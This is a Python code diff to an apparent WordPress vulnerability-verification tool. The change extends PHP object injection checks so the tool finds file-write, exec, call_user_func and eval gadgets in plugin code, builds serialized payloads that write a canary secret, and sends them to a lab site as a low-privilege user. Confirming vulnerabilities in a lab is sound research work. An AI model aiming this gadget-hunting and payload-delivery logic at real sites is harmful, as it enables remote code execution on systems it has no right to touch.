@@ -5267,24 +5267,33 @@ def verify_wordpress_deserialization(
     res = WpVerifyResult()
     t0 = time.time()
 
-    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
+    from .deserialize_gadgets import find_all_gadgets, build_payload as _build_deser_payload
     plugin_root = os.path.join(plugin_source_dir, slug)
-    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
-         "__wakeup()/__destruct() que escriba a fichero)...")
-    gadget = find_file_write_gadget(plugin_root)
-    if gadget is None:
+    step("escaneando el codigo real del plugin (incluyendo vendor/) en busca de gadgets de "
+         "deserializacion (file_write / exec / call_func / eval_code)...")
+    gadgets = find_all_gadgets(plugin_root, limit=5)
+    if not gadgets:
         res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
-                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
-                      "a una ruta publica via file_put_contents())")
-        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro del "
-                               "propio codigo del plugin (no cadenas de librerias de terceros "
-                               "como Monolog/Guzzle -- eso necesitaria PHPGGC u otra herramienta "
-                               "dedicada); si el plugin no trae una clase asi, no hay nada que "
-                               "verificar sin inventarse una cadena que no esta")
+                      "ni en su vendor/ (file_put_contents, system/exec, call_user_func, eval "
+                      "con propiedades publicas o dinamicas en __wakeup/__destruct)")
+        res.limitations.append("la verificacion de deserializacion busca gadgets propios del "
+                               "plugin (incluyendo vendor/) pero no cadenas de WP core ni "
+                               "librerias externas no incluidas -- si el plugin no trae gadget "
+                               "propio, no hay nada que verificar sin inventarse una cadena")
         return res
-    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
-         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
-         f"$this->{gadget.content_prop}))")
+
+    gadget = gadgets[0]
+    _gtype_desc = {
+        "file_write": f"file_put_contents($this->{gadget.path_prop}, $this->{gadget.content_prop})",
+        "exec":       f"{gadget.exec_func}($this->{gadget.cmd_prop})",
+        "call_func":  f"call_user_func($this->{gadget.func_prop}"
+                      + (f", $this->{gadget.arg_prop})" if gadget.arg_prop else ")"),
+        "eval_code":  f"eval($this->{gadget.code_prop})",
+    }.get(gadget.gadget_type, gadget.gadget_type)
+    step(f"gadget encontrado [{gadget.gadget_type}]: clase '{gadget.full_class_name}' "
+         f"en {gadget.file}:{gadget.line} ({gadget.magic_method} -> {_gtype_desc})")
+    if len(gadgets) > 1:
+        step(f"({len(gadgets) - 1} gadgets adicionales encontrados; probando con el primero)")
 
     serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)
 
@@ -5300,7 +5309,21 @@ def verify_wordpress_deserialization(
 
         secret = secrets.token_hex(16)
         canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
-        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
+        touch_cmd = f"touch {canary_path} && echo {secret} > {canary_path}"
+
+        if gadget.gadget_type == "file_write":
+            payload_obj = _build_deser_payload(gadget,
+                                               file_path=canary_path,
+                                               file_content=secret)
+        elif gadget.gadget_type in ("exec", "call_func"):
+            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
+        elif gadget.gadget_type == "eval_code":
+            payload_obj = _build_deser_payload(
+                gadget,
+                php_code=f"file_put_contents('{canary_path}','{secret}');")
+        else:
+            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
+
         m = (http_method or "POST").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
@@ -5308,7 +5331,8 @@ def verify_wordpress_deserialization(
             extra_nonce_pages=extra_nonce_pages)
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
-            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
+            "gadget_clase": gadget.full_class_name, "gadget_tipo": gadget.gadget_type,
+            "gadget_metodo": gadget.magic_method,
             "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
             "canary_secret": secret, "objeto_serializado": payload_obj,
             "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
@@ -5325,7 +5349,7 @@ def verify_wordpress_deserialization(
             except Exception as e:
                 tried.append({"modo": label, "error": str(e)})
                 return
-            time.sleep(1)   # el __destruct() puede dispararse al final de la peticion, no antes
+            time.sleep(1)   # __destruct() puede dispararse al final de la peticion, no antes
             r = lab.sh("exec", lab.wp, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
             content = (r.stdout or "")
             present = secret in content
@@ -5334,7 +5358,7 @@ def verify_wordpress_deserialization(
                 found = True
                 res.evidence["modo_ganador"] = label
                 res.evidence["contenido_fichero"] = content[:500]
-                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
+                step(f"VERIFICADO: el fichero canario {canary_path} contiene el secreto exacto -- "
                      f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")
 
         if serial_param:
@@ -5346,22 +5370,47 @@ def verify_wordpress_deserialization(
         if not found:
             try_send("cuerpo crudo", data=payload_obj.encode())
 
+        # segunda vuelta con otros gadgets encontrados si el primero fallo
+        if not found and len(gadgets) > 1:
+            for alt_gadget in gadgets[1:]:
+                step(f"probando gadget alternativo [{alt_gadget.gadget_type}]: "
+                     f"'{alt_gadget.full_class_name}'...")
+                if alt_gadget.gadget_type == "file_write":
+                    alt_obj = _build_deser_payload(alt_gadget,
+                                                   file_path=canary_path, file_content=secret)
+                elif alt_gadget.gadget_type in ("exec", "call_func"):
+                    alt_obj = _build_deser_payload(alt_gadget, cmd=touch_cmd)
+                else:
+                    alt_obj = _build_deser_payload(alt_gadget,
+                                                   php_code=f"file_put_contents('{canary_path}','{secret}');")
+                res.evidence[f"objeto_alternativo_{alt_gadget.full_class_name}"] = alt_obj
+                if serial_param:
+                    pay = dict(base_params)
+                    pay[serial_param] = alt_obj
+                    try_send(f"param-alt-{alt_gadget.full_class_name}",
+                             data=pay if m != "GET" else None,
+                             params=pay if m == "GET" else None)
+                if not found:
+                    try_send(f"raw-alt-{alt_gadget.full_class_name}", data=alt_obj.encode())
+                if found:
+                    break
+
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
             res.ok = True
             res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
-                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
-                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
-                          f"exacto en {canary_path} -- prueba inequivoca de PHP Object Injection, "
-                          f"no una deduccion por status code")
+                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' "
+                          f"[gadget_type={gadget.gadget_type}] se reconstruyo de verdad y su "
+                          f"{gadget.magic_method} escribio el secreto exacto en {canary_path} "
+                          f"-- prueba inequivoca de PHP Object Injection, no deduccion por status code")
         else:
             res.ok = True
-            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
-                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
-                          f"fichero canario apareciera con el secreto -- la deserializacion no "
-                          f"se confirmo (puede que el endpoint/parametro no sean los reales, o "
-                          f"que el valor no se pase a unserialize() sin filtrar)")
+            res.detail = (f"se encontraron {len(gadgets)} gadgets en el codigo pero ninguna "
+                          f"forma de mandarlos ({len(tried)} intentos) hizo que el fichero "
+                          f"canario apareciera con el secreto -- la deserializacion no se confirmo "
+                          f"(puede que el endpoint/parametro no sean los reales, o que el valor "
+                          f"no se pase a unserialize() sin filtrar)")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
@@ -5413,21 +5462,21 @@ def verify_wordpress_deserialization_custom_table(
     res = WpVerifyResult()
     t0 = time.time()
 
-    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
+    from .deserialize_gadgets import find_all_gadgets, build_payload as _build_deser_payload
     plugin_root = os.path.join(plugin_source_dir, slug)
-    step("escaneando el codigo real en busca de un gadget de deserializacion...")
-    gadget = find_file_write_gadget(plugin_root)
-    if gadget is None:
+    step("escaneando el codigo real del plugin (incluyendo vendor/) en busca de gadgets de "
+         "deserializacion...")
+    gadgets = find_all_gadgets(plugin_root, limit=5)
+    if not gadgets:
         res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del plugin "
-                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
-                      "a una ruta publica via file_put_contents())")
+                      "ni en su vendor/ (file_put_contents, system/exec, call_user_func, eval)")
         res.limitations.append("la verificacion de deserializacion por tabla propia tambien "
                                "necesita un gadget real en el propio codigo; si no hay ninguno, "
                                "no hay nada que verificar sin inventarse una cadena de terceros")
         return res
-    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
-         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
-         f"$this->{gadget.content_prop}))")
+    gadget = gadgets[0]
+    step(f"gadget encontrado [{gadget.gadget_type}]: clase '{gadget.full_class_name}' "
+         f"en {gadget.file}:{gadget.line} ({gadget.magic_method})")
 
     if not table_name or not column_name:
         res.detail = "no se dio la tabla/columna propia donde se almacena el valor"
@@ -5451,17 +5500,27 @@ def verify_wordpress_deserialization_custom_table(
             return res
 
         secret = secrets.token_hex(16)
-        # igual que en la variante de options (ver el commit que la retiro): el PASO 2 lo
-        # ejecuta un contenedor wp-cli EFIMERO Y SEPARADO (--rm), asi que la ruta canario tiene
-        # que vivir en el VOLUMEN COMPARTIDO para sobrevivir y ser visible desde el contenedor
-        # Apache despues -- confirmado en vivo que /tmp del contenedor wp-cli se pierde al
-        # terminar.
+        # el PASO 2 lo ejecuta un contenedor wp-cli EFIMERO Y SEPARADO (--rm), asi que la ruta
+        # canario tiene que vivir en el VOLUMEN COMPARTIDO para sobrevivir y ser visible desde
+        # el contenedor Apache despues -- confirmado en vivo que /tmp del contenedor wp-cli se
+        # pierde al terminar.
         canary_path = f"/var/www/html/binoracle_canary_{_token()}.txt"
-        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
+        touch_cmd = f"touch {canary_path} && echo {secret} > {canary_path}"
+        if gadget.gadget_type == "file_write":
+            payload_obj = _build_deser_payload(gadget,
+                                               file_path=canary_path, file_content=secret)
+        elif gadget.gadget_type in ("exec", "call_func"):
+            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
+        elif gadget.gadget_type == "eval_code":
+            payload_obj = _build_deser_payload(
+                gadget, php_code=f"file_put_contents('{canary_path}','{secret}');")
+        else:
+            payload_obj = _build_deser_payload(gadget, cmd=touch_cmd)
         m = (store_http_method or "POST").upper()
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
-            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
+            "gadget_clase": gadget.full_class_name, "gadget_tipo": gadget.gadget_type,
+            "gadget_metodo": gadget.magic_method,
             "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
             "canary_secret": secret, "objeto_serializado": payload_obj,
             "tabla": table_name, "columna": column_name, "columna_id": id_column,
